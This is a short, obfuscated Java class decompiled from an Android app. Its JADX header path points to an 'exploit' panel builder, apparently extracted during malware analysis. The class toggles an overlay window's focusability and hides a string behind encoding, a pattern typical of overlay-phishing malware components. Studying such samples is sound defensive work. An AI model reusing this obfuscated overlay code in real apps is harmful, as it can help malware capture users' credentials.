package v.s;

import android.content.ContextWrapper;
import android.view.ViewGroup;
import android.view.WindowManager;
import app.mobilex.plus.UtilNWWrapper;
import app.mobilex.plus.services.DataQFAdapter;
import app.mobilex.plus.util.TypefaceCache;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final /* synthetic */ class SXuc7yHnGVKI implements Runnable {
    public final /* synthetic */ ContextWrapper JXn4Qf7zpnLjP5;
    public final /* synthetic */ boolean vekpFI4d1Nc4fakF;
    public final /* synthetic */ int w9sT1Swbhx3hs = 0;

    public /* synthetic */ SXuc7yHnGVKI(UtilNWWrapper utilNWWrapper, boolean z) {
        this.JXn4Qf7zpnLjP5 = utilNWWrapper;
        this.vekpFI4d1Nc4fakF = z;
    }

    @Override // java.lang.Runnable
    public final void run() {
        switch (this.w9sT1Swbhx3hs) {
            case 0:
                UtilNWWrapper utilNWWrapper = (UtilNWWrapper) this.JXn4Qf7zpnLjP5;
                boolean z = this.vekpFI4d1Nc4fakF;
                String str = UtilNWWrapper.A1BaTVAMeIXMnh;
                if (!utilNWWrapper.isFinishing()) {
                    if (!z) {
                        utilNWWrapper.VEkRsTDS6a9oHWI();
                    } else {
                        utilNWWrapper.euF5Udt5Rqv3Qmea();
                    }
                }
                break;
            default:
                boolean z2 = this.vekpFI4d1Nc4fakF;
                DataQFAdapter dataQFAdapter = (DataQFAdapter) this.JXn4Qf7zpnLjP5;
                String str2 = vbdyByOHPJmeGXlq.dDIMxZXP1V8HdM;
                if (vbdyByOHPJmeGXlq.hjneShqpF9Tis4 && z2) {
                    try {
                        ViewGroup viewGroup = vbdyByOHPJmeGXlq.wotphlvK9sPbXJ;
                        if (viewGroup != null && vbdyByOHPJmeGXlq.b1EoSIRjJHO5) {
                            WindowManager windowManager = (WindowManager) dataQFAdapter.getSystemService("window");
                            ViewGroup.LayoutParams layoutParams = viewGroup.getLayoutParams();
                            WindowManager.LayoutParams layoutParams2 = layoutParams instanceof WindowManager.LayoutParams ? (WindowManager.LayoutParams) layoutParams : null;
                            if (layoutParams2 != null) {
                                layoutParams2.flags &= -17;
                                windowManager.updateViewLayout(viewGroup, layoutParams2);
                            }
                            break;
                        }
                    } catch (Exception e) {
                        String str3 = vbdyByOHPJmeGXlq.dDIMxZXP1V8HdM;
                        TypefaceCache.obtain("001300770048009400E400B700C000A800360071005300C700F600B300D300A000630064005E008A00FF00A900D700E7002600640049008800E200E50092");
                        e.getMessage();
                    }
                }
                break;
        }
    }

    public /* synthetic */ SXuc7yHnGVKI(DataQFAdapter dataQFAdapter, boolean z) {
        this.vekpFI4d1Nc4fakF = z;
        this.JXn4Qf7zpnLjP5 = dataQFAdapter;
    }
}
